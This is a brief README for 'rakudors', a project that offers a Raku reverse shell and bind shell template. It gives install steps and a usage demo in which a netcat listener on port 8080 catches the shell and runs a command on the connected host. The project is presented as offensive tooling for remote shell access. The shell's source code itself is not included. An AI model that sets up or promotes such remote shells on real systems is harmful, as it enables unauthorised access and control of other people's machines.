# rakudors

rakudo reverse shell (+ bind shell) template

https://rakudo.org/

**Install**

https://github.com/rakudo/rakudo

apt-get install rakudo

**Usage**

```
raku@do:~# rakudo rakurs.raku
```

```
raku@do:~# nc -lvp 8080
listening on [any] 8080 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 54800
pwd
/opt/rakurs
^C
```
